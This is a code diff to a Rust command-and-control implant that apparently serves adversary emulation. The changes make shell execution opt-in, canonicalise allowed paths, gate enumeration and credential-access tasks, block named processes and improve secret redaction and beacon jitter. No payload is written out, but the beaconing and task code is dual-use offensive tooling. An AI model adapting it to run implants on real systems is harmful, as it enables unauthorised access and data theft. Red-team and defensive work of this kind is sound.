@@ -12,6 +12,7 @@ use tracing::{error, info, warn};
 use tracing_appender::rolling::{RollingFileAppender, Rotation};
 use tracing_subscriber::{fmt, prelude::*, EnvFilter};
 use uuid::Uuid;
+use rand::Rng;
 
 const IMPLANT_VERSION: &str = "0.1.0";
 const DEFAULT_C2_HOST: &str = "http://localhost:8080";
@@ -25,19 +26,19 @@ const MAX_COLLECTION_BYTES: u64 = 10_000_000;
 const CRASH_LOOP_WINDOW_SECS: u64 = 60;
 const CRASH_LOOP_THRESHOLD: u32 = 3;
 
-const REDACT_PATTERNS: &[&str] = &[
-    r"(?i)(aws_access_key|aws_secret_key|aws_session_token)=[A-Za-z0-9+/]{20,}",
-    r"(?i)(password|passwd|pwd|secret|token|api_key|apikey)=[^\s]+",
-    r"(?i)bearer\s+[A-Za-z0-9+/=._-]+",
-    r"\b[A-Za-z0-9+/]{40,}\b",
-];
-
 fn redact_string(input: &str) -> String {
+    static REDACT_REGEXES: std::sync::OnceLock<Vec<regex::Regex>> = std::sync::OnceLock::new();
+    let regexes = REDACT_REGEXES.get_or_init(|| {
+        vec![
+            regex::Regex::new(r"(?i)(aws_access_key|aws_secret_key|aws_session_token)=[A-Za-z0-9+/]{20,}").unwrap(),
+            regex::Regex::new(r"(?i)(password|passwd|pwd|secret|token|api_key|apikey)=[^\s]+").unwrap(),
+            regex::Regex::new(r"(?i)bearer\s+[A-Za-z0-9+/=._-]+").unwrap(),
+            regex::Regex::new(r"\b[A-Za-z0-9+/]{40,}\b").unwrap(),
+        ]
+    });
     let mut result = input.to_string();
-    for pattern in REDACT_PATTERNS {
-        if let Ok(re) = regex::Regex::new(pattern) {
-            result = re.replace_all(&result, "[REDACTED]").to_string();
-        }
+    for re in regexes {
+        result = re.replace_all(&result, "[REDACTED]").to_string();
     }
     result
 }
@@ -55,7 +56,7 @@ impl Default for ScopeConfig {
         Self {
             cred_access_enabled: env::var("CRED_ACCESS_ENABLED").unwrap_or_default() == "true",
             collection_enabled: env::var("COLLECTION_ENABLED").unwrap_or_default() == "true",
-            shell_enabled: env::var("SHELL_ENABLED").unwrap_or_default() != "false",
+            shell_enabled: env::var("SHELL_ENABLED").unwrap_or_default() == "true",
             allowed_paths: env::var("ALLOWED_PATHS")
                 .unwrap_or_default()
                 .split(',')
@@ -76,8 +77,16 @@ fn is_path_in_scope(path: &str, config: &ScopeConfig) -> bool {
     if config.allowed_paths.is_empty() {
         return true;
     }
+    let canon = match std::fs::canonicalize(path) {
+        Ok(p) => p,
+        Err(_) => return false,
+    };
     for allowed in &config.allowed_paths {
-        if path.starts_with(allowed) {
+        let allowed_canon = match std::fs::canonicalize(allowed) {
+            Ok(p) => p,
+            Err(_) => continue,
+        };
+        if canon.starts_with(&allowed_canon) {
             return true;
         }
     }
@@ -86,7 +95,8 @@ fn is_path_in_scope(path: &str, config: &ScopeConfig) -> bool {
 
 fn setup_logging(log_dir: &PathBuf, implant_uuid: &str) {
     let file_appender = RollingFileAppender::new(Rotation::DAILY, log_dir, "rustybuns-implant.log");
-    let (non_blocking, _guard) = tracing_appender::non_blocking(file_appender);
+    let (non_blocking, guard) = tracing_appender::non_blocking(file_appender);
+    Box::leak(Box::new(guard));
 
     tracing_subscriber::registry()
         .with(
@@ -142,6 +152,7 @@ struct TaskResult {
     duration_ms: u64,
     mitre_id: Option<String>,
     technique: Option<String>,
+    output_length: Option<u64>,
 }
 
 fn get_hostname() -> String {
@@ -174,9 +185,14 @@ fn execute_task(platform: &impl platform::Platform, command: &str, args: &[Strin
     };
 
     if let Some(mitre_id) = task.mitre_id() {
-        if command == "cred-access-check" || command == "list-env" || command == "list-ssh" {
+        if command == "cred-access-check" {
             if !scope.cred_access_enabled {
                 return (Err("CRED_ACCESS_ENABLED=false — credential access blocked by scope".to_string()), Some(mitre_id.to_string()));
+            }
+        }
+        if command == "list-env" || command == "list-ssh" {
+            if !scope.collection_enabled {
+                return (Err("COLLECTION_ENABLED=false — enumeration blocked by scope".to_string()), Some(mitre_id.to_string()));
             }
         }
         if command == "collect" {
@@ -192,6 +208,16 @@ fn execute_task(platform: &impl platform::Platform, command: &str, args: &[Strin
         if command == "shell" {
             if !scope.shell_enabled {
                 return (Err("SHELL_ENABLED=false — shell execution blocked by scope".to_string()), Some(mitre_id.to_string()));
+            }
+            if let Some(arg0) = args.first() {
+                let proc_name = std::path::Path::new(arg0).file_name()
+                    .and_then(|s| s.to_str())
+                    .unwrap_or(arg0);
+                for blocked in &scope.blocked_processes {
+                    if proc_name.eq_ignore_ascii_case(blocked) {
+                        return (Err(format!("Process '{}' is blocked by scope", proc_name)), Some(mitre_id.to_string()));
+                    }
+                }
             }
         }
     }
@@ -304,7 +330,7 @@ async fn main() {
             }
         }
 
-        let jitter = jitter_min + rand_simple(jitter_max - jitter_min);
+        let jitter = jitter_min + rand::thread_rng().gen_range(0..=(jitter_max - jitter_min));
         sleep(Duration::from_secs(jitter)).await;
 
         if start_time.elapsed() > expiry_duration {
@@ -362,6 +388,7 @@ async fn main() {
                                     duration_ms: 0,
                                     mitre_id: Some("T1074".to_string()),
                                     technique: Some("Data staged".to_string()),
+                                    output_length: None,
                                 };
                                 let result_url = format!("/results/{}", implant_uuid);
                                 let _ = transport.send(&result_url, &task_result).await;
@@ -378,6 +405,7 @@ async fn main() {
                                 duration_ms: 0,
                                 mitre_id: Some("T1074".to_string()),
                                 technique: Some("Data staged".to_string()),
+                                output_length: None,
                             };
                             let result_url = format!("/results/{}", implant_uuid);
                             let _ = transport.send(&result_url, &task_result).await;
@@ -393,7 +421,7 @@ async fn main() {
                     match result {
                         Ok(output) => {
                             if command == "collect" {
-                                if let Some(size) = output.lines().find(|l| l.contains("[STATS]")).and_then(|l| l.split_whitespace().nth(2).and_then(|s| s.parse().ok())) {
+                                if let Some(size) = output.lines().find(|l| l.contains("[STATS]")).and_then(|l| l.split_whitespace().nth(3).and_then(|s| s.parse().ok())) {
                                     collection_bytes = collection_bytes.saturating_add(size);
                                 }
                                 last_collection = Some(Instant::now());
@@ -412,11 +440,12 @@ async fn main() {
                             let task_result = TaskResult {
                                 task_id: task.id.clone(),
                                 success: true,
-                                output: redacted_output,
+                                output: redacted_output.clone(),
                                 error: None,
                                 duration_ms: duration,
                                 mitre_id,
                                 technique,
+                                output_length: Some(redacted_output.len() as u64),
                             };
                             let result_url = format!("/results/{}", implant_uuid);
                             let _ = transport.send(&result_url, &task_result).await;
@@ -432,6 +461,7 @@ async fn main() {
                                 duration_ms: duration,
                                 mitre_id,
                                 technique,
+                                output_length: None,
                             };
                             let result_url = format!("/results/{}", implant_uuid);
                             let _ = transport.send(&result_url, &task_result).await;
@@ -451,10 +481,4 @@ async fn main() {
     }
 
     info!(event = "implant_shutdown", "Implant shutting down cleanly.");
-}
-
-fn rand_simple(max: u64) -> u64 {
-    let now = Instant::now();
-    let ns = now.elapsed().as_nanos();
-    (ns % max as u128) as u64
 }
